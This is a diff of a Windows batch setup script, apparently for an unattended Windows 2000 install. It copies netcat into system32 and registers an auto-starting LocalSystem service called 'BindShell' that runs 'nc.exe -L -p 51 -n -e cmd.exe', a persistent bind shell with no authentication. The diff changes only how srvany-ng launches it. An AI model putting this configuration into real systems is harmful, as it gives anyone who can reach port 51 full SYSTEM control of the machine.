@@ -3,8 +3,8 @@
 :: Install Support Tools
 msiexec /i "D:\SUPPORT\TOOLS\2000RKST.MSI" /qb
 
-:: Install srvany (extracted from Windows 2000 Server Resource Kit)
-copy "D:\VALUEADD\3RDPARTY\srvany.exe" "%SystemRoot%\system32\srvany.exe"
+:: Install srvany-ng
+copy "D:\VALUEADD\3RDPARTY\srvany-ng.exe" "%SystemRoot%\system32\srvany-ng.exe"
 
 :: Install Netcat
 copy "D:\VALUEADD\3RDPARTY\nc.exe" "%SystemRoot%\system32\nc.exe"
@@ -26,12 +26,14 @@ copy "D:\VALUEADD\3RDPARTY\nc.exe" "%SystemRoot%\system32\nc.exe"
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v DisplayName /t REG_SZ /d "BindShell" /f
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v Description /t REG_SZ /d "Allows remote access" /f
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v ErrorControl /t REG_DWORD /d 1 /f
-"%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v ImagePath /t REG_EXPAND_SZ /d "srvany.exe" /f
+"%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v ImagePath /t REG_EXPAND_SZ /d "srvany-ng.exe" /f
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v ObjectName /t REG_SZ /d "LocalSystem" /f
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v Start /t REG_DWORD /d 2 /f
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell" /v Type /t REG_DWORD /d 16 /f
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell\Parameters"
-"%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell\Parameters" /v Application /t REG_SZ /d "nc.exe -L -p 51 -n -e \"cmd.exe /c (cmd.exe 2^>^&1)\"" /f
+"%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell\Parameters" /v Application /t REG_SZ /d "%SystemRoot%\system32\nc.exe" /f
+"%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell\Parameters" /v AppParameters /t REG_SZ /d "-L -p 51 -n -e cmd.exe" /f
+"%ProgramFiles%\Support Tools\reg.exe" add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BindShell\Parameters" /v AppDirectory /t REG_SZ /d "%SystemDrive%\\" /f
 
 :: Map SMB drive to Z:
 "%ProgramFiles%\Support Tools\reg.exe" add "HKEY_CURRENT_USER\Network\Z"
